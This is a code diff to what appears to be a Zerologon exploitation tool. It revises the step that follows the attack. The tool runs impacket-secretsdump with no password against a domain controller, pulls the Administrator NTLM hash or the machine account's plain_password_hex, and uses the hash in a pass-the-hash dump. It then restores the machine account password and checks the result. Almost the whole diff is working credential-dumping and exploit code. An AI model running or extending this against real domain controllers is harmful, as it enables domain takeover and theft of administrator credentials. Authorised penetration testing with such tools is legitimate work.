@@ -149,7 +149,8 @@ def run_zerologon(dc_name, dc_ip):
 
 def _parse_admin_hash(output):
     for line in output.splitlines():
-        if not line.lower().startswith("administrator:"):
+        username = line.split(":", 1)[0].rsplit("\\", 1)[-1].lower()
+        if username != "administrator":
             continue
         parts = line.split(":")
         if len(parts) > 3:
@@ -159,7 +160,7 @@ def _parse_admin_hash(output):
 
 def _parse_plain_password_hex(output):
     for line in output.splitlines():
-        match = re.search(r"plain_password_hex\s*[:=]\s*([0-9a-fA-F]+)", line, re.IGNORECASE)
+        match = re.search(r"plain_password_hex\s*[:=]\s*(?:0x)?([0-9a-fA-F]+)", line, re.IGNORECASE)
         if not match:
             continue
         value = match.group(1).strip()
@@ -170,6 +171,27 @@ def _parse_plain_password_hex(output):
 
 def _secretsdump(command):
     return subprocess.run(command, capture_output=True, text=True)
+
+
+def _command_output(result):
+    return "\n".join(
+        part.strip()
+        for part in (result.stdout, result.stderr)
+        if part and part.strip()
+    )
+
+
+def _restore_failure_message(result, default):
+    output = _command_output(result)
+    if not output:
+        return default
+
+    lines = [line.strip() for line in output.splitlines() if line.strip()]
+    useful_lines = [
+        line for line in lines
+        if not line.startswith("Impacket v") and "Copyright" not in line
+    ]
+    return "\n".join(useful_lines[-6:]) or default
 
 
 def restore_machine_account_password_impacket(
@@ -190,34 +212,57 @@ def restore_machine_account_password_impacket(
 
     step_results = []
 
+    password_hex_cmd = [
+        "impacket-secretsdump",
+        f"{domain}/{account_name}@{dc_ip}",
+        "-no-pass",
+        "-just-dc-user",
+        account_name,
+        "-target-ip",
+        dc_ip,
+    ]
+    password_hex_result = _secretsdump(password_hex_cmd)
+    password_hex_output = _command_output(password_hex_result)
+    password_hex = _parse_plain_password_hex(password_hex_output)
+    if password_hex:
+        step_results.append("Machine account password hex extracted with machine account auth.")
+    else:
+        step_results.append("Machine account auth did not return password hex; trying Administrator hash fallback.")
+
     admin_hash_cmd = [
         "impacket-secretsdump",
         f"{domain}/{account_name}@{dc_ip}",
         "-no-pass",
+        "-just-dc-user",
+        "Administrator",
+        "-target-ip",
+        dc_ip,
     ]
-    admin_hash_result = _secretsdump(admin_hash_cmd)
-    admin_hash_output = admin_hash_result.stdout or admin_hash_result.stderr
-    admin_hash = _parse_admin_hash(admin_hash_output)
-    if not admin_hash:
-        message = admin_hash_result.stderr.strip() or "Administrator hash not found."
-        return [f"Restore failed: {message}"]
-    step_results.append("Administrator hash collected.")
-
-    password_hex_cmd = [
-        "impacket-secretsdump",
-        f"{domain}/Administrator@{account_host}",
-        "-hashes",
-        f":{admin_hash}",
-    ]
-    password_hex_result = _secretsdump(password_hex_cmd)
-    password_hex_output = password_hex_result.stdout or password_hex_result.stderr
-    password_hex = _parse_plain_password_hex(password_hex_output)
     if not password_hex:
-        message = password_hex_result.stderr.strip() or "plain_password_hex not found."
+        admin_hash_result = _secretsdump(admin_hash_cmd)
+        admin_hash_output = _command_output(admin_hash_result)
+        admin_hash = _parse_admin_hash(admin_hash_output)
+        if not admin_hash:
+            message = _restore_failure_message(admin_hash_result, "Administrator hash not found.")
+            return [f"Restore failed: {message}"]
+        step_results.append("Administrator hash collected.")
+
+        password_hex_cmd = [
+            "impacket-secretsdump",
+            f"{domain}/Administrator@{account_host}",
+            "-hashes",
+            f":{admin_hash}",
+            "-target-ip",
+            dc_ip,
+        ]
+        password_hex_result = _secretsdump(password_hex_cmd)
+        password_hex_output = _command_output(password_hex_result)
+        password_hex = _parse_plain_password_hex(password_hex_output)
+    if not password_hex:
+        message = _restore_failure_message(password_hex_result, "plain_password_hex not found.")
         return [f"Restore failed: {message}"]
     if len(password_hex) % 2 != 0:
         return ["Restore failed: plain_password_hex is not valid hex (odd length)."]
-    step_results.append("Machine account password hex extracted.")
 
     restore_script = os.path.join(
         os.path.dirname(__file__),
@@ -234,9 +279,9 @@ def restore_machine_account_password_impacket(
         password_hex,
     ]
     restore_result = _secretsdump(restore_cmd)
-    restore_output = restore_result.stdout or restore_result.stderr
+    restore_output = _command_output(restore_result)
     if restore_result.returncode != 0:
-        message = restore_result.stderr.strip() or "Restorepassword failed."
+        message = _restore_failure_message(restore_result, "Restorepassword failed.")
         return [f"Restore failed: {message}"]
     if restore_output.strip():
         step_results.extend(restore_output.strip().splitlines())
@@ -247,9 +292,11 @@ def restore_machine_account_password_impacket(
         "impacket-secretsdump",
         f"{domain}/{account_name}@{dc_ip}",
         "-no-pass",
+        "-target-ip",
+        dc_ip,
     ]
     verify_result = _secretsdump(verify_cmd)
-    verify_output = verify_result.stdout or verify_result.stderr
+    verify_output = _command_output(verify_result)
     if verify_result.returncode == 0 and "Administrator:" in verify_output:
         step_results.append("Verification failed: machine account password is still blank.")
     else:
